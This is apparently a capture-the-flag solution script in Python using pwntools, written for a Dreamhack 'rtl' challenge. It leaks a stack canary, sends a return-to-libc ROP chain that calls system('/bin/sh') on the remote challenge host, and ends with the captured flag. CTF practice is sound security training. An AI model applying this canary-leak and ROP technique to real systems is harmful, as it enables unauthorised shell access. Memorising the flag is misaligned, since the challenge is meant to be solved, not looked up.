#!/usr/bin/env python3

from pwn import *

HOST = "host3.dreamhack.games"
PORT = 16717

context.binary = elf = ELF('./rtl', checksec = False)
# libc = ELF('', checksec = False)

# p = process(elf.path)
p = remote(HOST, PORT)

binsh = 0x400874
pop_rdi = 0x0000000000400853
system_plt = elf.plt['system']
ret = 0x0000000000400285

p.sendafter(b'Buf: ', b'x'*(0x40 - 0x8 + 1))
p.recvuntil(b'x'*(0x40 - 0x8 + 1))
canary_leaked = u64(b'\x00' + p.recv(7))
log.info('canary = ' + hex(canary_leaked))

payload = b'x'*(0x40-0x8) + p64(canary_leaked) + b'x'*8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_plt) 
p.sendafter(b'Buf: ', payload)

p.interactive()

# DH{13e0d0ddf0c71c0ac4410687c11e6b00}